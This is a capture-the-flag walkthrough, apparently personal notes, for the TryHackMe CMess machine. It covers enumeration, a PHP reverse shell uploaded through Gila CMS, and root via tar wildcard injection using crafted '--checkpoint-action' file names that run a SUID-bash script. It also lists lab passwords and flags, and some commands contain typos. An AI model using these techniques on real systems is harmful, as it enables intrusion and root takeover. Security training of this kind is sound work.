## Target: 10.64.132.66 > cmess.thm
### Recon
- Nmap: 
	- nmap -p- cmess.thm
	- nmap -p 22,80 -A cmess.thm -oA nmap
### Enumeration
- Open Ports:
	- **22**/tcp, **ssh**, OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
	- **80**/tcp, **http**, Apache httpd 2.4.18 ((Ubuntu))
- Web Findings:
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.10 - 3.13
- Navigating to http://10.64.132.66 reveals a Gila CMS page
- Robots.txt:
User-agent: *
Disallow: /src/
Disallow: /themes/
Disallow: /lib/
- Gobuster reveals many directories:
root@ip-10-64-85-162:~# gobuster dir -u http://cmess.thm -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cmess.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 274]
/.htpasswd            (Status: 403) [Size: 274]
/0                    (Status: 200) [Size: 3851]
/01                   (Status: 200) [Size: 4078]
/1                    (Status: 200) [Size: 4078]
/1x1                  (Status: 200) [Size: 4078]
/about                (Status: 200) [Size: 3353]
/About                (Status: 200) [Size: 3339]
**/admin**               (Status: 200) [Size: 1580]
/api                  (Status: 200) [Size: 0]
/assets               (Status: 301) [Size: 318] [--> http://cmess.thm/assets/?url=assets]
/author               (Status: 200) [Size: 3590]
/blog                 (Status: 200) [Size: 3851]
/.hta                 (Status: 403) [Size: 274]
/category             (Status: 200) [Size: 3862]
/cm                   (Status: 500) [Size: 0]
/feed                 (Status: 200) [Size: 735]
/fm                   (Status: 200) [Size: 0]
/index                (Status: 200) [Size: 3851]
/Index                (Status: 200) [Size: 3851]
/lib                  (Status: 301) [Size: 312] [--> http://cmess.thm/lib/?url=lib]
/log                  (Status: 301) [Size: 312] [--> http://cmess.thm/log/?url=log]
**/login**                (Status: 200) [Size: 1580]
/robots.txt           (Status: 200) [Size: 65]
/search               (Status: 200) [Size: 3851]
/Search               (Status: 200) [Size: 3851]
/server-status        (Status: 403) [Size: 274]
/sites                (Status: 301) [Size: 316] [--> http://cmess.thm/sites/?url=sites]
/src                  (Status: 301) [Size: 312] [--> http://cmess.thm/src/?url=src]
/tag                  (Status: 200) [Size: 3874]
/tags                 (Status: 200) [Size: 3139]
/themes               (Status: 301) [Size: 318] [--> http://cmess.thm/themes/?url=themes]
/tmp                  (Status: 301) [Size: 312] [--> http://cmess.thm/tmp/?url=tmp]
- /admin and /login both take us to a login page.
- An internet search does not reveal any default credentials
- Now we try fuzzing for subdomains, as directed by a hint THM gives us
``ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "HOST: FUZZ.cmess.thm" -u http://cmess.thm -fw 522``
- This reveals a _dev_ subdomain
- We add the path to our /etc/hosts file
``10.64.132.66    dev.cmess.thm``
- Visiting the page reveals an email communication with a user's password
	- andre@cmess.thm:KPFTN_f2yxe%
- Lets try to login to the admin page
- Sure enough, we get in with those credentials
### Exploitation
- Once inside, we find a File Manager page on which we can upload files to the server. Let's try a php reverse shell script. Start a nc listener and wait.
	- Viewing the file in the file manager (in the assets folder) give us a URL that looks like:
		http://10.64.132.66/admin/fm?f=assets/php-reverse-shell.php
	- Let's try this url: http:cmess.thm/assets/php-reverse-shell.php
		- Yup, we now have a shell running as user _www-data_
- Upgrade to an interactive shell with ``python3 -c 'import pty;pty.spawn("/bin/bash")'``
### Post Exploitation
- Now we serve linpeas.sh on our local host via a python3 server and transfer this to our remote machine via it's shell ``wget http://cmess.thm:8000/linpeas,sh``
- Linpeas runs. We find a couple things:
	- A hidden file _/opt/.password.bak_
	- A cronjob that appears to be backing up a folder in andre's home directory
- Viewing the hidden file gives us andre's backup password _UQfsdCB7aAP6_. Let try it.
	- Yep, we are able to log in to andre's account ``su - andre``
- Find the user flag in his home directory: _thm{c529b5d5d6ab6b430b7eb1903b2b5e1b}_
### Privilege Escalation
- Now lets look at the cron job we found with linpeas
				_Had to look at a guide for the rest of this. Read about [[Wildcard Injection]]_
- Every two minutes, all files and folders in the /home/andre/backup folder are backed up to the /tmp folder and tar'd. There is a _wildcard_ though, which means that _anything_ in the backup folder will be backed up. Apparently we can abuse this to get root.
- We will create a bash one-liner and give it _setuid_ and _setgid_ permissions
``echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash" > exploit.sh``
- We will copy that file to /home/andre/backup
- Now:
	- ``touch /home/andre/backup/ -- checkpoint=1``
	- _"--checkpoint=1: A real tar option. It tells tar to display a progress message after every 1 file processed (like a "heartbeat"). This is harmless but required to trigger the next option reliably."_
	- ``touch /home/andre/backup/ — checkpoint-action=exec=sh\ exploit.sh``
		- --checkpoint-action=exec=sh exploit.sh: Another real tar option.
		- --checkpoint-action=exec=COMMAND: Runs COMMAND after each checkpoint.
		- Here, COMMAND is sh exploit.sh (the \ escapes the space for the filename).
_When tar expands the wildcard, it interprets these filenames (starting with --) as its own command-line flags, letting you execute arbitrary code as root._

- The \ is a **shell escape character**. In bash (the shell we're running commands in), spaces separate arguments. If we wrote sh exploit.sh without escaping, the shell would think we want three separate arguments for touch: sh, exploit.sh, and whatever comes next.
- By adding \ before the space, it tells the shell: "Treat sh\ exploit.sh as _one single string_—don't split on the space."
- **Resulting filename**: --checkpoint-action=exec=sh exploit.sh (with a _real space_ between sh and exploit.sh).
- When we list files (ls), it'll show as --checkpoint-action=exec=sh exploit.sh—the space is preserved in the name.
- Now we wait 2 minutes and run ``/tmp/bash -p``
- Root!
### Flags
- User: _thm{c529b5d5d6ab6b430b7eb1903b2b5e1b}_
- Root: _thm{9f85b7fdeb2cf96985bf5761a93546a2}_
### Notes
- See [this convo](https://grok.com/share/bGVnYWN5LWNvcHk_9380c992-0f83-4570-87e0-c90102830ad9) to learn more about why this exploit works, and specifically why we are able to set the SUID (It is because root is running exploit.sh and so root is setting the SUID bit)